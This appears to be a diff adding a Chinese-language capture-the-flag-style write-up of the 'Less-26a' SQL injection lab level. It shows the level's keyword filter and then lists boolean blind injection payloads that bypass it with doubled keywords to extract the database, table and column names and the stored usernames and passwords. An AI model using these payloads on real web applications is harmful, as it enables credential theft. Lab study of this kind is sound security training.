@@ -1,0 +1,26 @@
+<hr>
+<h2 id="title-less26aurl-https-www-yuque-com-u29002979-ep2zrx-shvs86haf90l8lou"><a href="#title-less26aurl-https-www-yuque-com-u29002979-ep2zrx-shvs86haf90l8lou" class="headerlink" title="title: less26aurl: https://www.yuque.com/u29002979/ep2zrx/shvs86haf90l8lou"></a>title: less26a<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/shvs86haf90l8lou">https://www.yuque.com/u29002979/ep2zrx/shvs86haf90l8lou</a></h2><pre><code class="bash">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
+
+$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);			 //strip out OR (non case sensitive)
+$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);		 //Strip out AND (non case sensitive)
+$id= preg_replace(&#39;/[\/*]/&#39;,&quot;&quot;, $id);	 //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);		 //Strip out --
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);			 //Strip out #
+$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);		 //Strip out spaces
+$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);		 //Strip out spaces
+$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes
+</code></pre>
+<p>less26a过滤的东西与less26一致，闭合方式为单引号’,<br>但是<strong>没有报错的回显</strong>&amp;#x20;<br>尝试<strong>布尔盲注</strong>解决该问题</p>
+<p><code>1&#39;</code></p>
+<blockquote>
+<p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-26a\index.php</strong> on line <strong>36</strong></p>
+</blockquote>
+<p><code>1&#39;aandnd&#39;1&#39;=&#39;1</code>返回正常<br><code>1&#39;aandnd&#39;1&#39;=&#39;2</code>没有返回结果<br>用**单引号’**闭合 <a name="F1MU5"></a></p>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><a name="MvWqA"></a></p>
+<h2 id="判断库长"><a href="#判断库长" class="headerlink" title="判断库长"></a>判断库长</h2><p>用二分法来确定库长<br><code>1&#39;anandd(length(database())&lt;10)||&#39;1</code>返回正常<br><code>1&#39;anandd(length(database())&gt;5)||&#39;1</code>返回正常<br><code>1&#39;anandd(length(database())=8)||&#39;1</code>返回正常<br>数据库长度为8 <a name="u8msB"></a></p>
+<h2 id="逐一字符判断数据库名称"><a href="#逐一字符判断数据库名称" class="headerlink" title="逐一字符判断数据库名称"></a>逐一字符判断数据库名称</h2><p><code>1&#39;anandd(ascii(substr((database()),1,1))=115)||&#39;1</code>返回正常,s<br>… <a name="MZkCo"></a></p>
+<h2 id="数据表长度"><a href="#数据表长度" class="headerlink" title="数据表长度"></a>数据表长度</h2><p><code>1&#39;anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&gt;20)||&#39;1</code>正常回显<br><code>1&#39;anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))&lt;30)||&#39;1</code>正常回显<br><code>1&#39;anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))=29)||&#39;1</code>正常回显<br>数据表串起来长为29 <a name="TD0Ss"></a></p>
+<h2 id="逐一字符判断数据表名称"><a href="#逐一字符判断数据表名称" class="headerlink" title="逐一字符判断数据表名称"></a>逐一字符判断数据表名称</h2><p><code>1&#39;anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101)||&#39;1</code>正常回显,e<br>… <a name="xiptE"></a></p>
+<h2 id="判断列长"><a href="#判断列长" class="headerlink" title="判断列长"></a>判断列长</h2><p><code>1&#39;anandd(length((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name=&#39;users&#39;)))=20)||&#39;1</code>正常回显,列长串起来是为20 <a name="Aqf5t"></a></p>
+<h2 id="逐一字符判断字段名称"><a href="#逐一字符判断字段名称" class="headerlink" title="逐一字符判断字段名称"></a>逐一字符判断字段名称</h2><p><code>1&#39;anandd(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name=&#39;users&#39;)),1,1))=105)||&#39;1</code>正常回显,i<br>… <a name="NdqVW"></a></p>
+<h2 id="逐一字符判断字段内容"><a href="#逐一字符判断字段内容" class="headerlink" title="逐一字符判断字段内容"></a>逐一字符判断字段内容</h2><p><code>1&#39;anandd(ascii(substr((select(group_concat(username,0x7e,passwoorrd))from(users)),1,1))=68)||&#39;1</code>显示正常,D<br>…</p>
